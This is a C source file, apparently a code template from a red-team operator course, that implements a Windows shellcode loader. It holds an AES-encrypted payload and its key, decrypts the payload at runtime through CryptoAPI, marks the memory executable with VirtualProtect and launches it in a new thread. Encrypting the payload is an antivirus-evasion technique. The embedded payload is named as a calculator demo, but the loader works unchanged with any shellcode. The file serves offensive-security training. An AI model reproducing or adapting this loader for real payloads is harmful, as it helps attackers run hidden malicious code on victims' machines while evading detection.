/*

 Red Team Operator course code template
 payload encryption with AES
 
 author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	char key[] = { 0xd6, 0xd9, 0xfb, 0x26, 0xec, 0xe8, 0x7, 0x16, 0xe0, 0x23, 0x6f, 0xb0, 0x7f, 0xb, 0x9e, 0x2a };
	unsigned char calc_payload[] = { 0x1e, 0xb8, 0x5e, 0xd2, 0xf6, 0x84, 0xee, 0x9d, 0x1, 0xf4, 0x71, 0x4d, 0x76, 0x44, 0xbf, 0x50, 0xd7, 0xc6, 0x6f, 0xeb, 0x41, 0xbb, 0xe2, 0x72, 0x48, 0x81, 0xe7, 0xef, 0x88, 0xe4, 0x23, 0x9, 0xbc, 0x7, 0x2e, 0x29, 0x6b, 0x0, 0xe7, 0x23, 0xdc, 0xbe, 0x1b, 0x88, 0x8f, 0x40, 0x1a, 0x42, 0x89, 0xca, 0x8d, 0xcf, 0xcb, 0x56, 0xf8, 0x87, 0xfa, 0x53, 0x3d, 0x3d, 0xe8, 0x96, 0x7, 0x8a, 0xfd, 0x43, 0x55, 0x17, 0xe8, 0x8c, 0x40, 0xd1, 0xca, 0x17, 0x5a, 0x5c, 0x91, 0xb3, 0x26, 0x41, 0x7f, 0xfb, 0x1c, 0xc3, 0x7e, 0xfe, 0x54, 0x5c, 0x73, 0x3a, 0x61, 0x19, 0x12, 0x5, 0xa9, 0x53, 0x7, 0x4c, 0x6c, 0xc1, 0xc5, 0x40, 0x3a, 0x0, 0xfd, 0xcd, 0xb5, 0x6e, 0xd3, 0xf0, 0x2b, 0x35, 0x39, 0xd, 0x8e, 0x2f, 0xd4, 0x83, 0x90, 0xa, 0xfa, 0x34, 0xf8, 0x56, 0x51, 0xc1, 0xad, 0x99, 0x1f, 0xc9, 0x17, 0x6d, 0x11, 0x78, 0x5d, 0xb9, 0x89, 0xd0, 0x38, 0xf0, 0x3, 0xb5, 0x79, 0x5a, 0x31, 0xc4, 0xff, 0x22, 0xe6, 0x46, 0x3e, 0xd2, 0x9c, 0xca, 0xf, 0x9a, 0xd5, 0x76, 0x70, 0xa8, 0x34, 0x8e, 0x6d, 0x48, 0x74, 0xee, 0xd6, 0x6c, 0xc9, 0xaf, 0x41, 0xad, 0x4, 0xe5, 0xd8, 0x15, 0x2c, 0x87, 0xbf, 0xe, 0xb8, 0x2, 0x38, 0x25, 0xc2, 0x63, 0xce, 0xe6, 0xb, 0x70, 0xe0, 0x9f, 0xc4, 0xe4, 0xc8, 0x38, 0x11, 0x88, 0x6, 0xdc, 0x17, 0xe0, 0x1d, 0x1, 0x6a, 0xa6, 0xf9, 0x1, 0xce, 0xb8, 0x46, 0x79, 0x80, 0xc9, 0x9d, 0xda, 0x2d, 0x91, 0x22, 0x18, 0x6c, 0xc6, 0x55, 0x0, 0xa6, 0x68, 0xb7, 0x9a, 0xcb, 0xf6, 0x21, 0x75, 0x15, 0x31, 0xae, 0x8e, 0x5c, 0xcd, 0x2c, 0x5d, 0x90, 0x86, 0x73, 0x97, 0x85, 0x27, 0x41, 0xd8, 0x86, 0x6d, 0xf7, 0xc0, 0x74, 0x29, 0x11, 0xbb, 0xb8, 0xdd, 0x7b, 0x2b, 0x4b, 0xb8, 0x1, 0x30, 0x7e, 0xe4, 0x6c, 0x28, 0x41, 0x71, 0x9b, 0xc, 0x6b, 0x42, 0xa1, 0xe4, 0x60, 0x47, 0x61, 0x52, 0xd3, 0x4c, 0x96, 0x37, 0xac, 0x11, 0x42, 0xdf };

	unsigned int calc_len = sizeof(calc_payload);
	
	// Allocate memory for payload
	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	printf("\nHit me 1st!\n");
	getchar();

	// Decrypt payload
	AESDecrypt((char *) calc_payload, calc_len, key, sizeof(key));
	
	// Copy payload to allocated buffer
	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me 2nd!\n");
	getchar();

	// If all good, launch the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}